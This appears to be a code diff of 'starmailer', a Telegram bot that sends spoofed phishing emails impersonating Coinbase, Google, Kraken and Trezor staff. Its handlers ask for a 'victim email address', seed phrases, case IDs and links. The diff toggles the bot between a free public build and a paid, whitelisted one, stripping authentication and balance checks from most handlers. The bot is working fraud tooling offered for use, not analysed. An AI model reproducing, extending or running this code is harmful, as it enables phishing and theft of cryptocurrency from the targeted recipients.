@@ -1,7 +1,3 @@
-# STARMAILER - PUBLIC VERSION
-# No authentication, no balance checks, no restrictions
-# Free for everyone to use!
-
 import logging
 import sys
 import json
@@ -94,7 +90,13 @@ def save_balances():
 load_balances()
 
 def deduct_balance(user_id: int, amount: float = 5.0) -> bool:
-    # Public version - no balance deduction required
+    user_id_str = str(user_id)
+    if user_id_str not in user_balances:
+        return False
+    if user_balances[user_id_str] < amount:
+        return False
+    user_balances[user_id_str] -= amount
+    save_balances()
     return True
 
 def load_email_counts():
@@ -157,37 +159,51 @@ def log_email_details(update: Update, command_type: str, victim_email: str, extr
     file_logger.info(log_message)
 
 async def add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    # Public version - no balance system needed
+    user_id = update.effective_user.id
+    if user_id != ADMIN_ID:
+        await update.message.reply_text("You are not authorized to use this command.")
+        return
+    if len(context.args) != 2 or not context.args[1].isdigit():
+        await update.message.reply_text("Usage: /add_balance <user_id> <amount>")
+        return
+
+    target_user_id = str(context.args[0])
+    amount = float(context.args[1])
+    if target_user_id in user_balances:
+        user_balances[target_user_id] += amount
+    else:
+        user_balances[target_user_id] = amount
+    save_balances()
     await update.message.reply_text(
-        "This is a public bot! No balance system - all features are completely FREE for everyone! 🎉"
+        f"Added ${amount} to user {target_user_id}'s balance."
     )
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     user_count = user_email_counts.get(str(user_id), 0)
+    balance = user_balances.get(str(user_id), 0)
     start_message = (
-        "🚀 Welcome to @starmailer - PUBLIC VERSION\n"
-        "📧 Free email templates for everyone!\n"
+        "Welcome to @starmailer\n"
         "Support: @lovecoinbase\n\n"
         "[Info]\n\n"
-        f"• Total mails sent: {global_email_count}\n"
+        f"• Mails sent: {global_email_count}\n"
         f"• Your mails sent: {user_count}\n"
-        "• ✅ NO BALANCE REQUIRED - Completely FREE!\n"
-        "• ✅ NO AUTHENTICATION - Open for all users!\n\n"
+        f"• Your balance: ${balance:.2f}\n\n"
         "[Misc]\n\n"
         "• /id - Get your user id.\n"
         "• /cancel - Cancel sending your mail.\n"
         "• /custom_mail - Send your own mail\n\n"
-        "[Coinbase Templates]\n\n"
+        "[Coinbase]\n\n"
         "• /employee_coinbase - Send a case review coinbase email.\n"
         "• /wallet_coinbase - Send a coinbase wallet email.\n"
         "• /secure_coinbase - Send a secure link coinbase email.\n"
         "• /coinbase_delay - Send a delay email for manual review.\n\n"
-        "[Other Templates]\n\n"
-        "• /employee_google - Send a Google employee email.\n"
-        "• /employee_kraken - Send a Kraken employee email.\n"
+        "[Google]\n\n"
+        "• /employee_google - Send a Google employee email.\n\n"
+        "[Kraken]\n\n"
+        "• /employee_kraken - Send a Kraken employee email.\n\n"
+        "[Trezor]\n\n"
         "• /employee_trezor - Send a trezor employee email.\n\n"
-        "🎯 All features are FREE and available to everyone!\n"
 
     )
     await update.message.reply_text(start_message)
@@ -202,26 +218,37 @@ async def get_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     user_id = update.effective_user.id
     await update.message.reply_text(f"Your user ID is: {user_id}")
 
-def check_auth(update: Update) -> bool:
-    # Public version - no authentication required
-    return True
+# Authentication checks removed for open access
+# def check_auth(update: Update) -> bool:
+#     return update.effective_user.id in whitelisted_users
 
-async def unauthorized_access(
-    update: Update, context: ContextTypes.DEFAULT_TYPE
-) -> None:
-    # Public version - this should never be called
-    await update.message.reply_text("Welcome! This bot is open for everyone to use.")
+# async def unauthorized_access(
+#     update: Update, context: ContextTypes.DEFAULT_TYPE
+# ) -> None:
+#     await update.message.reply_text("Unauthorized access.")
 
-async def whitelist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    # Public version - no whitelist needed, everyone can use the bot
-    await update.message.reply_text(
-        "This is a public bot! No whitelist needed - everyone can use all features freely."
-    )
+# Whitelist functionality removed for open access
+# async def whitelist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+#     user_id = update.effective_user.id
+#     if user_id != ADMIN_ID:
+#         await update.message.reply_text("You are not authorized to use this command.")
+#         return
+#     if len(context.args) != 1 or not context.args[0].isdigit():
+#         await update.message.reply_text("Please provide a valid user ID to whitelist.")
+#         return
+#
+#     new_user_id = int(context.args[0])
+#     if new_user_id in whitelisted_users:
+#         await update.message.reply_text(f"User {new_user_id} is already whitelisted.")
+#     else:
+#         whitelisted_users.append(new_user_id)
+#         save_whitelist()
+#         await update.message.reply_text(
+#             f"User {new_user_id} has been whitelisted successfully."
+#         )
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    if not check_auth(update):
-        await unauthorized_access(update)
-        return ConversationHandler.END
+    # Authentication check removed for open access
     await update.message.reply_text("Email sending cancelled.")
     context.user_data.clear()
     return ConversationHandler.END
@@ -271,15 +298,7 @@ async def get_recipients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
 async def custom_mail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Initiates the custom email flow."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text("Insufficient balance. Please top up your balance.")
-        return ConversationHandler.END
-
+    # Authentication and balance checks removed for open access
     await update.message.reply_text("Enter the victim email address:")
     return CUSTOM_VICTIM_EMAIL
 
@@ -351,71 +370,27 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
 async def wallet_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the flow for sending a Coinbase wallet email, asks only for the seed phrase."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
-
     context.user_data.clear()
     context.user_data["conversation"] = "wallet_coinbase"
     await update.message.reply_text("Enter the victim email address:")
     return RECIPIENTS
 
 async def employee_google(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for sending a Google employee email with balance deduction."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
-
+    """Handles the flow for sending a Google employee email."""
     context.user_data.clear()
     context.user_data["conversation"] = "employee_google"
     await update.message.reply_text("Enter the victim email address:")
     return RECIPIENTS
 
 async def secure_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for secure Coinbase emails with balance deduction."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
-
+    """Handles the flow for secure Coinbase emails."""
     context.user_data.clear()
     context.user_data["conversation"] = "secure_coinbase"
     await update.message.reply_text("Enter the victim email address:")
     return RECIPIENTS
 
 async def employee_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for sending a Coinbase employee email with balance deduction."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
-
+    """Handles the flow for sending a Coinbase employee email."""
     context.user_data.clear()
     context.user_data["conversation"] = "employee_coinbase"
     await update.message.reply_text("Enter the victim email address:")
@@ -437,7 +412,6 @@ async def spoof_email_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await query.message.reply_text("Enter the representative name:")
         return REPRESENTATIVE
 
-    
 async def get_amount_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     try:
 
@@ -458,8 +432,6 @@ async def get_amount_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     except ValueError:
         await update.message.reply_text("Please enter a valid number for the amount.")
         return AMOUNT_TOKEN
-
-
 
 async def get_representative(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data["representative"] = update.message.text
@@ -526,7 +498,6 @@ async def get_case_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
         await update.message.reply_text(message)
         return ConversationHandler.END
 
-
 async def get_seed_phrase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data["seed_phrase"] = update.message.text
     recipients = context.user_data["recipients"]
@@ -567,12 +538,8 @@ async def get_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data.clear()
     return ConversationHandler.END
 
-
-
-
-
 async def send_employee_coinbase_email(
-    context, recipients, representative, case_id, display_email
+    update, recipients, representative, case_id, display_email
 ):
     """Send the Employee Coinbase Email."""
     template_path = HTML_TEMPLATE_PATH  
@@ -611,16 +578,16 @@ async def send_employee_coinbase_email(
             msg,
             recipients,
         )
-        log_email_details(context, "employee_coinbase", recipients, {"representative": representative, "case_id": case_id}) 
+        log_email_details(update, "employee_coinbase", recipients, {"representative": representative, "case_id": case_id}) 
         return "Coinbase Employee Mail sent successfully!"
     except Exception as e:
         return f"Failed to send email due to an internal error: {e}"
 
-async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_email):
+async def send_wallet_coinbase_email(update, recipients, seed_phrase, display_email):
     """Send the Coinbase Wallet Email."""
    
     log_email_details(
-        context, "wallet_coinbase", recipients, {"seed_phrase": seed_phrase}
+        update, "wallet_coinbase", recipients, {"seed_phrase": seed_phrase}
     )
 
     template_path = HTML_WALLET_TEMPLATE_PATH
@@ -659,7 +626,7 @@ async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_e
         return f"Failed to send email due to an internal error: {e}"
 
 async def send_secure_coinbase_email(
-    context, recipients, link, representative, case_id, display_email
+    update, recipients, link, representative, case_id, display_email
 ):
     """Send the Secure Coinbase Email with a link and attached images."""
     template_path = HTML_SECURE_TEMPLATE_PATH
@@ -697,21 +664,18 @@ async def send_secure_coinbase_email(
             msg,
             recipients,
         )
-        log_email_details(context, "secure_coinbase", recipients, {"link": link}) 
+        log_email_details(update, "secure_coinbase", recipients, {"link": link}) 
         return "Coinbase Secure Link Mail sent successfully!"
     except Exception as e:
         return f"Failed to send email due to an internal error: {e}"
 
 async def send_employee_google_email(
-    context, recipients, representative, case_id, display_email
+    update, recipients, representative, case_id, display_email
 ):
     """Send the Employee Google Email with attached images."""
 
     log_email_details(
-        context,
-        "employee_google",
-        recipients,
-        {"representative": representative, "case_id": case_id},
+        update, "employee_google", recipients, {"representative": representative, "case_id": case_id},
     )
 
     template_path = HTML_GOOGLE_TEMPLATE_PATH
@@ -749,36 +713,14 @@ async def send_employee_google_email(
         return f"Failed to send email due to an internal error: {e}"
 
 async def employee_kraken(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for sending a Kraken employee email with balance deduction."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
-
+    """Handles the flow for sending a Kraken employee email."""
     context.user_data.clear()
     context.user_data["conversation"] = "employee_kraken"
     await update.message.reply_text("Enter the victim email address:")
     return RECIPIENTS
 
 async def employee_trezor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for sending a Trezor employee email with balance deduction."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
-
+    """Handles the flow for sending a Trezor employee email."""
     context.user_data.clear()
     context.user_data["conversation"] = "employee_trezor"
     await update.message.reply_text("Enter the victim email address:")
@@ -786,7 +728,7 @@ async def employee_trezor(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
 
 async def send_employee_trezor_email(
-    context, recipients, representative, case_id, display_email
+    update, recipients, representative, case_id, display_email
 ):
     """Send the Employee Trezor Email."""
     template_path = HTML_TREZOR_TEMPLATE_PATH 
@@ -824,7 +766,7 @@ async def send_employee_trezor_email(
             msg,
             recipients,
         )
-        log_email_details(context, "employee_trezor", recipients, {"representative": representative, "case_id": case_id})
+        log_email_details(update, "employee_trezor", recipients, {"representative": representative, "case_id": case_id})
         return "Trezor Employee Mail sent successfully!"
     except Exception as e:
         return f"Failed to send email due to an internal error: {e}"
@@ -845,15 +787,12 @@ async def spoof_email_choice_kraken(
     return REPRESENTATIVE
 
 async def send_employee_kraken_email(
-    context, recipients, representative, case_id, display_email
+    update, recipients, representative, case_id, display_email
 ):
     """Send the Employee Kraken Email with attached images."""
    
     log_email_details(
-        context,
-        "employee_kraken",
-        recipients,
-        {"representative": representative, "case_id": case_id},
+        update, "employee_kraken", recipients, {"representative": representative, "case_id": case_id},
     )
 
     template_path = HTML_KRAKEN_TEMPLATE_PATH
@@ -896,17 +835,6 @@ async def send_employee_kraken_email(
 
 async def coinbase_delay(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the flow for sending a Coinbase delay email."""
-    if not check_auth(update):
-        await unauthorized_access(update, context)
-        return ConversationHandler.END
-
-    user_id = update.effective_user.id
-    if not deduct_balance(user_id):
-        await update.message.reply_text(
-            "Insufficient balance. Please top up your balance."
-        )
-        return ConversationHandler.END
-
     context.user_data.clear()
     context.user_data["conversation"] = "coinbase_delay"
     await update.message.reply_text("Enter the victim email address:")
